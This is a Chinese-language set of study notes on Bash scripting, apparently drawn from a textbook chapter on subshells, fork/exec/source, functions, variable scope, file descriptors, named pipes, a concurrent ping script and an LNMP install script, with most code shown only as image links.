分析脚本执行结果，启动脚本后进入的Shell被认为是父Shell，当前工作目录是/root，变量BASH_SUBSHELL的值为默认初始值0。通过（）启动了一个子Shell，子Shell继承了父Shell的变量与工作目录等环境信息，因此，在子Shell中当前工作目录依然是/root，父Shell定义的变量hi，在子Shell中依然可以正常使用并在屏幕上显示该变量的值，同时变量BASH_SUBSHELL的值会自动加1（结果为0+1=1）。最后为了验证父Shell不可以读取子Shell的环境信息，在子Shell中定义了一个名称为sub_hi的变量，并在子Shell中切换工作目录到/etc。当（）结束脚本再次回到父Shell时，会发现子Shell切换工作目录对父Shell无效，父Shell当前工作目录依然是/root，而子Shell定义的变量sub_hi在父Shell中也无法被调用，父Shell开始时定义的变量hi依然可以使用，回到父Shell后BASH_SUBSHELL自动减1（1-1=0）。

![image-20220319164050232](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319164050232.png)

除了（）可以启动子Shell，还有别的方式可以启动子Shell吗？

使用&符号将命令放入后台会产生新的子Shell，另外使用管道符号|或者分组命令符号（）也会产生新的子Shell，使用命令替换$（）也会产生新的子Shell，在Shell脚本中执行一个外部命令同样会启动新的子Shell。

先来看一个使用管道开启子Shell后导致脚本运行错误的案例。该脚本希望通过循环读取df命令并输出第四列内容，统计所有存储设备剩余容量的总和。

![image-20220319170110534](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170110534.png)

![image-20220319170133804](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170133804.png)

上面的脚本之所以返回值为0，是因为使用了管道符号，管道会导致整个while循环都在子Shell中执行，在子Shell中通过循环读取df命令输出的第四列值并求和，而等所有循环结束，脚本返回父Shell后，子Shell中计算的所有值在父Shell中都无法被调用。为了方便追踪错误，将上面的脚本进行适当修改，重新编写如下脚本。

![image-20220319170401903](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170401903.png)

![image-20220319170419360](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319170419360.png)

分析脚本执行结果，通过管道进入子Shell后，确实可以读取磁盘剩余容量

可以正常工作的。但是，当所有设备容量都读取完毕，循环结束后脚本会返回父Shell中，在父Shell中再次显示sum的值时，输出结果为0。

如何才可以解决这样的问题呢？通过文件重定向的方式读取文件，就不会再开启子Shell。所以，在前面的nginx_log.sh日志分析脚本中，在需要读取文件并对文件进行分析时应该使用重定向输入，而不是使用管道开启子Shell。

![image-20220319170933993](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170933993.png)

![image-20220319172222056](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172222056.png)

在脚本中使用外部命令，包括加载其他脚本也都会开启一个子Shell，所以在脚本中需要调用其他脚本时一定要使用source加载。

![image-20220319172523563](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172523563.png)

![image-20220319172748050](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172748050.png)

![image-20220319172910534](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172910534.png)

从脚本执行的结果可知，在脚本中调用外部命令pstree时，查看进程树可以看到pstree命令是在subshell_05.sh下启动的一个子进程。而通过Bash调用env.sh脚本也会产生子Shell，读取完env.sh程序返回父Shell后，再显示变量的值则为空。因此，如果需要在脚本中调用其他脚本最好使用source命令加载，使用source命令加载脚本不会开启子Shell。

最后看一个后台进程的问题示例。前面章节中我们编写了测试某个网段内所有主机是否可以连通的脚本，但是默认仅在ping通主机1之后才会继续测试主机2，依此类推。如果测试一台主机需要3秒，254台主机就需要762秒（约12分钟），可以使用&将ping命令放入后台，这样做的好处是可以并发测试。下面的脚本通过变量count统计可以连通的主机数量，但是，因为&也会导致启动子Shell，所有子Shell中定义的计算变量的值无法在父Shell中调用，结果就导致脚本执行完成后，屏幕返回值永远为0。

![image-20220319173004347](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319173004347.png)

### 4.5 启动进程的若干种方式

接下来讨论在Shell中执行命令创建进程的几种方式：fork方式、exec方式、source方式。

1）fork方式

通常情况下在系统中通过相对路径或绝对路径执行一个命令时，都会由父进程开启一个子进程，当子进程结束后再返回父进程，这种行为过程就叫作fork。当脚本中正常调用一个外部命令[插图]或其他脚本时，都会fork一个子Shell进程，我们的命令会运行在这个子Shell中。比如下面这个脚本中的所有语句都会fork一个子进程。

![image-20220319174450006](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319174450006.png)



这个脚本在执行的过程中会打开另一个终端窗口，反复执行pstree可以获得如下的进程树信息。可以看出，当脚本调用一个外部命令sleep时，系统会fork一个子Shell, sleep命令是在子Shell中执行的。当脚本通过相对路径或绝对路径调用其他脚本（如tmp.sh）时，也会fork一个子进程，并且tmp.sh脚本中的命令被触发执行时也会再次fork子进程。

![image-20220319174457874](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319174457874.png)

使用fork方式开启的子进程是父进程的一个副本，因此会自动单向继承父进程的环境，如环境变量、位置变量、资源权限、内存中的数据、信号等。但是，父进程无法继承子进程的环境。

![image-20220319181223938](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181223938.png)

脚本开启子进程流程图

2）exec方式

也可以使用内部命令exec调用其他命令或脚本，语法格式如下。

![image-20220319181916473](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181916473.png)

![image-20220319181927146](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181927146.png)

如图所示，一个脚本中包含三个命令，一个是通过exec执行ls命令，一个是使用echo命令让屏幕回显一个字符串信息，最后一个是cd命令，用于切换目录。但是，因为第一个命令使用exec调用ls，系统会使用ls命令替换当前的整个脚本，整个进程就变成了一个ls命令，当ls命令结束后进程也就结束了。原脚本中exec后面的所有命令都不会再被执行！为了防止当前脚本被覆盖，一般都会将exec写入另一个脚本，先使用fork方式调用该脚本，然后在fork的子进程中调用exec命令。下面这个脚本在执行完ls命令后会直接退出

![image-20220319182138964](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182138964.png)

但是有一个特例，当exec后面的参数是文件重定向时，不会替换当前Shell环境，脚本后续的其他命令也不会受到任何影响。

3）source方式

使用source命令或．（点）可以不开启子Shell，而在当前Shell环境中将需要执行的命令加载进来，执行完加载的命令后，继续执行脚本中后续的指令。

下面看一个简单的示例。

![image-20220319182428106](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319182428106.png)

![image-20220319182506893](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182506893.png)

![image-20220319182649209](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182649209.png)

在上面的source.sh脚本中使用source命令加载/root/tmp.sh脚本，source命令会在不开启子Shell的情况下，将tmp.sh中的所有命令加载到当前Shell环境中，类似tmp.sh文件中的所有命令是编写在source.sh文件中的一样

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\image-20220319182703178.png)

从进程树的角度分析，如果不使用source命令加载tmp.sh，而是直接使用路径调用脚本，则进程树效果如下。

![image-20220319205616567](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205616567.png)

如果使用source命令加载其他脚本（如tmp.sh），则其他脚本中的命令将被载入当前Shell中直接执行，进程树效果如下。

![image-20220319205632345](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205632345.png)

### 4.6 非常实用的函数功能

与大多数开发语言一样，Shell同样支持函数功能。函数就是给一段代码起一个别名，也就是函数名，定义函数名的规则与定义变量名的规则基本一致，但是函数名允许以数字开头。使用函数可以方便地封装某种特定功能的代码，在调用函数时不需要关心它是如何实现的，只需知道这个函数是做什么的，就可以直接调用它完成某项功能。函数必须先定义，才能被调用。合理地使用函数可以将一个大的工程分割为若干小的功能模块，代码的可读性更好，还可以有效避免代码重复。

定义函数的语法格式有多种，可以任选一种方式，调用函数时直接写函数名即可。

![image-20220319205801519](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205801519.png)

在命令行就可以直接演示函数的定义和调用，下面是简单的语法格式演示。

![image-20220319210232406](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210232406.png)

定义函数并不会导致函数内的任何命令被执行，仅当通过函数名称调用时，函数内的命令才会被触发执行。

![image-20220319210357598](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210357598.png)

如果需要取消函数，可以使用unset命令取消函数的定义。

![image-20220319210409513](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210409513.png)

在实际编写脚本时，经常会使用函数的功能给脚本编写提示信息，比如脚本的帮助或用法信息。下面就是这样的示例脚本文件。

![image-20220319211257115](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211257115.png)

![image-20220319211307356](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211307356.png)

![image-20220319211602267](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211602267.png)

通过上面的示例可以知道，函数其实类似于别名，就是给一段代码起一个别名，当调用该别名时函数中的代码就会被触发执行。但是，前面示例中的函数并不能被反复调用，因为函数体内编写的代码用的全部都是常量，所以在第二次被调用时就会创建名称相同的目录与文件。这样的函数非常不灵活。怎么解决这个问题呢？答案是使用变量！Shell中的函数支持传递参数，可以通过向函数体内传递变量参数，确保函数可以被反复调用。

在函数体内部可以通过变量$1、$2读取位置参数，在调用函数时添加相应的参数即可，或者读取其他全局变量都可以实现传递变量参数的功能。

实现上面功能的函数代码如下。

![image-20220319212253606](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319212253606.png)

有了这种通过位置变量传递参数的机制，就可以使用函数编写更加灵活的脚本，比如监控服务功能就可以写成函数，通过传递变量就可以编写一个通用的监控服务是否启动的脚本。

![image-20220319213849225](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319213849225.png)

![image-20220319213859363](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319213859363.png)

上面的脚本在调用函数时添加了不止一个参数，而在函数体内通过$@就可以读取所有位置参数，并通过for循环遍历每一个参数，在for循环内部使用if语句判断服务是否启动。这个脚本中定义的函数也可以被反复调用，每次调用时添加不同的位置参数，即可检测不同服务的状态。

### 4.7 变量的作用域与return返回值

Shell脚本中执行函数时并不会开启子进程，默认在函数外部或函数内部定义和使用变量的效果相同。函数外部的变量在函数内部可以直接调用，反之函数内部的变量也可以在函数外部直接调用。但这样会导致变量混淆、数据可能被错误地修改等问题，下面通过一个示例看看变量的作用域问题。

![image-20220319215031920](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319215031920.png)

![image-20220319215112310](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319215112310.png)

分析脚本输出结果，在demo函数外部定义的两个变量在函数内部都可以被调用，并且还可以被修改。默认global_var1和global_var2为当前Shell环境中的全局变量[插图]，而执行函数不会开启子Shell，因此在函数内部也可以调用和修改变量。示例中在函数内部修改了global_var2的参数值，而在demo函数中定义的变量func_var默认也是全局变量，因此在函数外部使用echo命令调用函数内部变量func_var是可以正常显示的，而global_var2参数值在函数中被修改了，最终脚本输出的也是修改后的内容。

但是，这样的结果有时并不是我们希望看到的。在一个实际工程脚本文件中，有时会因为在函数外部和函数内部定义了相同名称的变量，从而导致数据被意外篡改！如何防止在函数内部修改函数外部的全局变量呢？可以通过local语句定义仅在函数内部有效的局部变量

![image-20220319221525825](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319221525825.png)

分析执行结果，首先在脚本开始时定义了两个全局变量global_var1和global_var2，然后在函数内部使用local命令定义一个与全局变量重名的局部变量global_var2，并设置新的变量值，但是这样并不会覆盖全局变量的值。在函数内部调用变量global_var1时，因为在函数内部没有与之重名的变量，所以直接显示全局变量的值。而在函数内部调用变量global_var2时，因为在函数内部定义了与全局变量重名的global_var2，系统会优先调用函数内部的局部变量，所以输出的结果为Broke Girls。最后当函数执行结束时，在函数外部再次使用echo命令调用global_var1和global_var2变量，并不会受函数的任何影响，输出结果仍然是全局变量的值：hello world。

正常情况下定义的普通变量和数组都是在当前Shell中有效的全局变量。但是使用declare定义的关联数组则是一种特殊情况，在函数外部定义的关联数组为全局变量，而在函数体内部定义的关联数组则默认是在函数内部有效的局部变量。

![image-20220319222240083](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319222240083.png)

分析脚本执行结果，在函数体外定义的普通数组变量a和在函数体内定义的普通数组重名，因为默认情况下都是全局变量，所以数组变量a的值被覆盖，不管在函数内部还是外部，屏幕显示的都是覆盖后的新值（xx yy zz）。而关联数组是个特例，在函数外部定义的关联数组b为全局变量，虽然在函数内部也定义了同名的关联数组变量，但是仅在函数内部调用数组b时才显示88和99，在函数外部调用数组b时显示的结果依然是11和22。

最后还有一个注意事项，定义函数不会导致函数被执行，因此在没有调用函数时，无论是全局变量还是局部变量，都不可以在外部和内部之间相互调用。

![image-20220319223327113](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319223327113.png)

分析脚本执行结果，在这个示例中仅定义了函数，但并没有调用函数，因此在函数内部定义的变量func_var及对变量global_var2的修改实际上都没有被执行。当在函数外部使用echo命令调用func_var时实际就是空值，global_var1和global_var2变量的值也没有任何变化，最后的输出结果为hello world。

执行完函数后，默认整个函数的状态码为函数内部最后一个命令的返回值。我们在3.10节中学习了使用exit命令自定义返回码，但是在函数中如果使用了exit命令就会导致整个脚本直接退出。可以使用return命令立刻让函数中断并返回特定的状态码，并且不会影响脚本中后续的其他命令。

![image-20220319224311210](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319224311210.png)

![image-20220319225416947](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319225416947.png)

分析脚本执行结果，脚本中定义了三个函数，分别是demo1、demo2和demo3。demo1函数中没有自定义任何返回码，因此在脚本中调用demo1函数后，使用echo命令查看函数返回状态码为0（也就是函数内uname -r命令的返回码）。demo2函数使用return命令自定义的返回码为100，因为return会让函数立刻中断，所以调用demo2函数时，屏幕仅显示start demo2而不会显示demo2 end，调用完函数后，再通过echo命令查看函数的返回码为自定义的100。最后一个函数使用了exit命令，该命令不仅中断了函数，同时中断了整个脚本，因此调用demo3函数时，屏幕显示hello，然后整个脚本意外中断，并没有执行后续的echo命令，也没有显示demo3函数的返回码。

### 4.8 实战案例：多进程的ping脚本

前面已经使用循环语句编写过ping某个网络内所有主机连通性的脚本，但是当时的脚本并没有使用函数，也没有使用&符号开启后台子进程脚本，所以整个脚本的执行效率非常低。现在学习了函数及子Shell的知识，就可以重新优化编写功能更强大、效率更高的ping测试脚本了。

![image-20220319232140681](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232140681.png)

![image-20220319232316864](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232316864.png)

真的很快

分析脚本执行结果，因为在循环体中是以后台方式执行multi_ping函数的，所以不再需要等待第一台主机测试完成后再测试下一台主机，瞬间就可以将254台主机的测试任务都放入后台执行。屏幕的返回结果是无序的，谁先回应ping消息，屏幕就先返回谁的信息。

这样的脚本仅耗时几秒就可以测试整个网段。但是，这个脚本还是有问题！脚本瞬间将254个进程放入后台，脚本瞬间已经把所有需要执行的命令都执行完毕，然后脚本退出。所以在执行完脚本后的一瞬间，当脚本中的命令执行完后系统就返回命令行，而在系统返回命令行后，还在后台执行ping的命令会开始慢慢返回执行结果（可以连通或不能连通的信息），因此192.168.4.6 is up这个信息就显示在命令提示符的后面。更大的问题是，其实脚本执行的一瞬间就返回命令行，但是254个ping返回全部结果却需要几秒，等所有返回结果都显示在屏幕上后，屏幕就有可能宕机！因为系统早已返回命令行，命令行的提示符也已经在脚本执行后的一瞬间返回并显示了，这样就需要手动执行一个回车操作才可以继续后面的其他操作。出现这样的问题就是因为脚本退出的速度太快，解决这个问题可以使用wait命令，该命令后如果输入进程号作为参数，可以等待某个进程或后台进程结束并返回该进程的状态。如果没有指定任何参数，则wait会等待当前Shell激活的所有子进程结束，返回状态为最后一个进程的退出状态。

我们可以继续优化上面的脚本，在脚本最后添加一个wait命令，这样可以在所有的后台子进程都结束，也就是所有的ping测试都结束后，再退出脚本。

![image-20220319232848436](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232848436.png)



### 4.9 控制进程数量的核心技术——文件描述符和命名管道

经过前面的优化，一个多进程的脚本基本已经成型。但还有问题需要解决，在执行多进程脚本的同时在其他终端窗口使用ps aux命令查看进程列表，会发现同时启动了几百个进程，对于ping这样的小程序还好，如果是一个非常消耗CPU、内存、磁盘I/O资源的程序呢？启动几百个这样的程序并行执行，系统会瞬间崩溃！

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD\image-20220320195705630.png)



我们需要想办法控制进程的数量，比如一次仅启动10个进程，等待这10个进程都结束再启动10个，依此类推。如何控制进程的数量呢？这里需要引入文件描述符和命名管道的概念

#### 1）文件描述符

文件描述符是一个非负整数，而内核需要通过这个文件描述符才可以访问文件。当我们在系统中打开已有的文件或新建文件时，内核每次都会给特定的进程返回一个文件描述符，当进程需要对文件进行读或写操作时，都要依赖这个文件描述符进行。文件描述符就像一本书的目录页数（也叫索引），通过这个索引可以找到需要的内容。在Linux或类UNIX系统中内核默认会为每个进程创建三个标准的文件描述符，分别是0（标准输入）、1（标准输出）和2（标准错误）。通过查看/proc/PID号/fd/目录下的文件，就可以查看每个进程拥有的所有文件描述符。

![image-20220320200123269](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200123269.png)

查看当前shell的文件描述符

![image-20220320200218838](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200218838.png)

查看system的文件描述符

当打开文件时系统内核就会为特定的进程自动创建对应的文件描述符。下面通过示例演示这样一个过程，首先开启一个命令终端，在命令行中使用nano打开任意一个文件。

![image-20220320200328977](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200328977.png)

同时开启第二个终端窗口，通过ps命令查看vim进程的进程号，并观察该进程的文件描述符。

![image-20220320201327386](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320201327386.png)

![image-20220320201430908](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220320201430908.png)

![image-20220320201734618](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320201734618.png)

除了系统自动创建文件描述符，还可以通过命令手动自定义文件描述符。

![image-20220320202229775](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202229775.png)

关闭文件描述符语法格式如下。

![image-20220320202245477](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202245477.png)

创建只可重定向输出的test文件

![image-20220320203001409](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203001409.png)

![image-20220320202903540](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202903540.png)

![image-20220320203058318](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203058318.png)

还能给在命令中调用它

![image-20220320203141142](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203141142.png)

![image-20220320203356550](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203356550.png)

关闭文件描述符

![image-20220320203427171](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203427171.png)

关掉后就用不了了

上面案例中首先创建了一个仅可以重定向输出的文件描述符（12），可以通过&12调用该文件描述符，使用echo将消息重定向输出到12这个文件描述符就等同于输出到文件test.txt。但是，当调用该文件描述符进行重定向导入时会失败，该文件描述符不支持重定向输入。

创建只可重定向输入的test文件

![image-20220320204328094](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320204328094.png)

注意：文件仅能被输出一次 后面想要继续输出的话得再次exec 13<test.txt。但是重定向输出的文件可以被输入很多次

![image-20220320204830810](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320204830810.png)

同样 重定向输入的文件不支持输出

关闭的话也就是<与>的差别



能不能创建一个既可以输出又可以实现输入功能的文件描述符呢？答案是可以的！

![image-20220320205104614](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320205104614.png)

但是同样的  我们的重定向输入的文件仅可以被输出一次

关闭的话只要一个exec 14<&-就够了



下面看一个非常容易导致数据丢失的案例，在生产环境中如果不注意这样的问题，有可能会付出惨痛的代价。

![image-20220320205912759](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320205912759.png)

可以看到 关掉文件描述符的话用>或者<都可以

继续继续

![image-20220320210116337](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320210116337.png)

可以看到这样原数据会丢失

![image-20220320210523299](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320210523299.png)

这样数据就不会覆盖

使用cat命令可以通过文件描述符读取文件的全部内容。另外，read命令后跟-u选项也可以通过文件描述符读取文件内容，但不同的是，read命令每次仅读取一行数据。通过下面的演示，再多学习一些文件描述符的细节技术。

![image-20220320213215829](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320213215829.png)

从上面这一系列的操作演示中，我们要理解，文件描述符并不是简单地对应一个文件的。文件描述符中还包含有很多文件相关的信息，如权限、文件偏移量等。文件偏移量更像一个指针，它指向某个文件的位置，默认情况下该指针指向的是文件的起始位置，当使用read命令读取一行数据后，该指针会指向下一行数据，再使用read读取一行内容，指针再往下移动一行，依此类推，直到文件结束。通过文件描述符读取文件行的流程如下图所示。

![image-20220320213435916](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220320213435916.png)

 因为cat命令会读取文件的全部内容，所以当我们使用cat命令读取文件描述符时，文件描述符的指针会一次性跳到文件的末尾，一旦到了文件末尾，则再通过文件描述符读取文件的内容就为空，因为没有内容可读了。但是可以重新打开文件描述符，还可以再次从开始位置读取数据内容。

同样的道理，也可以每次仅读取文件的任意个字符。这样的话，指针就会停留在特定字符的后面，等待下一次再通过文件描述符读取文件内容时，就会继续从这个位置读取后续的内容。read命令可以通过-n选项指定读取任意字符的数据。

![image-20220320214110470](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320214110470.png)

值得注意的是    每当一个行的所有字符读完后

下一次read -u12 -n 都是空白的 然后在下一次运行才会继续读取(只针对 read -u12 -n)

不仅查看内容会导致指针移动，写入数据同样也会导致指针移动。通过文件描述符追加写入数据后，就不能再查看了，因为指针已经移动到了文件末尾的位置。



创建文件描述符时，如果文件描述符对应的文件不存在，系统会自动创建一个新的空文件。

![image-20220320215204711](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320215204711.png)

可以看到通过文件描述符查看为空

面的操作，先开启一个可读写的文件描述符，然后通过重定向输出的方式往文件中写入两行数据，同时文件描述符中的偏移量指针也随之往下移动。当使用文件描述符读取数据时，指针已经移动到最后，此时再使用cat命令查看文件后续内容则为空，但是前面写入文件的内容不会丢失，使用文件名的方式直接访问，数据都还在。

#### 2）命名管道

接下来，学习命名管道的知识。管道是进程间通信的一种方式，前面已经介绍了匿名管道，使用|符号就可以创建一个匿名管道，顾名思义，系统会自动创建一个可以读写数据的管道，但是这个管道并没有名称。一个程序往管道中写数据，另一个程序就可以从管道中读取数据。但是匿名管道仅可以实现父进程与子进程之间的数据交换，能不能实现任意两个无关的进程之间的通信呢？答案是肯定的，使用命名管道，也叫FIFO文件。

命名管道具有如下几个特征。

```
● FIFO文件由命令创建（mknod或mkfifo命令），可以在文件系统中直接看到。
● 写入管道的数据一旦被读取后，就不可以再重复读取。
● 进程往命名管道中写数据时，如果没有其他进程读取数据，则写进程会被阻塞。
● 进程尝试从命名管道中读取数据时，如果管道中没有数据，则读进程会被阻塞。
● 命名管道中的数据常驻内存，并不实际写入磁盘，读写效率会更高。
```

![image-20220321153259632](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153259632.png)

创建命名管道，不指定权限

![image-20220321153332741](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153332741.png)

创建命名管道，并指定全年

![image-20220321153444134](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153444134.png)

查看文件属性 第一列为P

![image-20220321153650766](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153650766.png)

写阻塞（特征  无法返回输入框）

使用echo命令将数据重定向导入管道，因为暂时没有其他进程从管道中读取数据，所以写数据的echo命令被阻塞。

![image-20220321153722376](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153722376.png)

![image-20220321153729376](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153729376.png)

开启另一个命令终端窗口，执行读操作时，回到第一个窗口写阻塞会自动被解除（特征：返回输入框）。

与上面的演示类似，反之当从命名管道中读取数据时，如果管道中并没有数据，读进程会被阻塞。因为前面的操作已经将pie_file1中的数据读出，此时管道中已没有任何数据。

![image-20220321153819866](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153819866.png)

可以看到被阻塞

我们开启另一个命令终端窗口，执行写操作时，再回到第一个窗口读阻塞会自动被解除。

![image-20220321153943914](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153943914.png)

![image-20220321153924183](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321153924183.png)

可以看到本来那个窗口回显123并且解除

说了这么多文件描述符与命名管道的铺垫，该进入正题了，对于多进程的脚本如何控制进程的数量呢？通过命名管道的阻塞功能就可以有效地阻止开启过多的进程！但是只有命名管道还不够，正常情况下cat命令读取命名管道数据会一次性全部读完，这里需要每次仅读取一行数据，而read命令通过文件描述符就可以读取文件的行数据。

![image-20220321155401648](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155401648.png)

![image-20220321155222427](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155222427.png)

![image-20220321155235041](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155235041.png)

![image-20220321155350575](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321155350575.png)

有了这样的技巧可以控制进程数量后，就可以再次修改前面的ping测试脚本，实现一个可以任意控制进程数量的多进程ping测试脚本。

![image-20220321162026865](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162026865.png)

![image-20220321162038816](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162038816.png)

![image-20220321162144959](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162144959.png)

虽然这样速度很慢

![image-20220321162847671](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321162847671.png)

而且还得再搞个重新排列 把报错弄掉

### 4.10 实战案例：一键源码部署LNMP的脚本

在生产环境中为服务器安装部署软件包是运维人员非常重要的一项工作，一般可以通过RPM、YUM或者源码安装部署软件包。这些方式中源码包安装方式具有很多RPM所不具备的优势，比如可以自定义安装路径、自定义模块、获得更新的版本等，但是，使用源码包安装软件往往也是最复杂的一种方式。怎么办呢？我们即需要源码包的灵活性，又不希望每次安装都很麻烦。在生产环境中一般都会选择将源码包的安装步骤写入脚本，实现一键安装软件包的功能，也有部分企业是将源码自定义制作成个性化的RPM包。

下面的案例以使用源码部署目前比较主流的LNMP环境为例，编写一个自动化部署脚本。实现这样的脚本需要编写大量的代码，如果没有函数，脚本会显得杂乱无章，本案例会使用函数的方式编写。

首先通过变量设置一些颜色属性，方便在脚本运行过程中给使用者恰当颜色的信息提示。然后测试系统的YUM源是否可以使用，如果没有YUM源则无法完成源码包相关依赖软件的安装，如果YUM源可用就可以通过install_deps函数安装LNMP相关的依赖软件包。最后就是定义一系列的函数进行源码包的安装、修改配置文件、生成systemd启动配置文件。

![image-20220321223032441](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223032441.png)

![image-20220321223053366](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223053366.png)

![image-20220321223104790](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223104790.png)

![image-20220321223112186](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223112186.png)

![image-20220321223119959](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223119959.png)

![image-20220321223131244](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223131244.png)

![image-20220321223233669](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223233669.png)

![image-20220321223240936](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321223240936.png)

### 4.11 递归函数

一个会自己直接或间接调用自己的函数称为递归函数。下面用递归函数的方式再次编写一个求斐波那契数列的和的脚本。
